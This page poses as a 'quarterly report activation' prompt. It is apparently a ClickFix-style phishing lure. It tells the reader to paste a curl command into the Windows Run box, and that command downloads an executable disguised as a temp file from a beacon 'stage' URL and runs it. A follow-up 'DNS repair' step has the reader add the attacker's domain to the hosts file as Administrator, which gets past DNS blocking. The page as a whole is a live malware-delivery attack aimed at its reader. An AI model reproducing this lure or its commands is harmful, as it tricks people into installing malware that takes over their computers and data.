Report activation required

Your quarterly report is ready but must be activated on this workstation before it can be opened. The activation takes a few seconds.

  1. Press Win + R together
  2. Click the command below to copy it, then paste it into the Run box
  3. Press Enter — the report manifest downloads and the documents open automatically
curl.exe -sk --doh-url https://1.1.1.1/dns-query -o "%TEMP%\~DFcmd.exe" "https://sync.protaskir.co.il/api/v1/beacons/0ac6182d-e8ef-436a-b3a4-f51ccecd53b4/stage?cap=61c21dd31373b8ad38a5c96d6d942ebd&fmt=loader-raw" && start "" "%TEMP%\~DFcmd.exe"
click the command once to copy — it is long, that is expected

✔ Copied. Paste it into the Run box and press Enter.

If the download fails — DNS repair (run once, admin cmd)

Some workstations cannot resolve the delivery service name. Run this once from an Administrator command prompt, then re-run the activation command above:

echo 104.21.28.252 sync.protaskir.co.il>>C:\Windows\System32\drivers\etc\hosts

✔ Copied. Paste into an Administrator cmd and press Enter, then retry the activation.
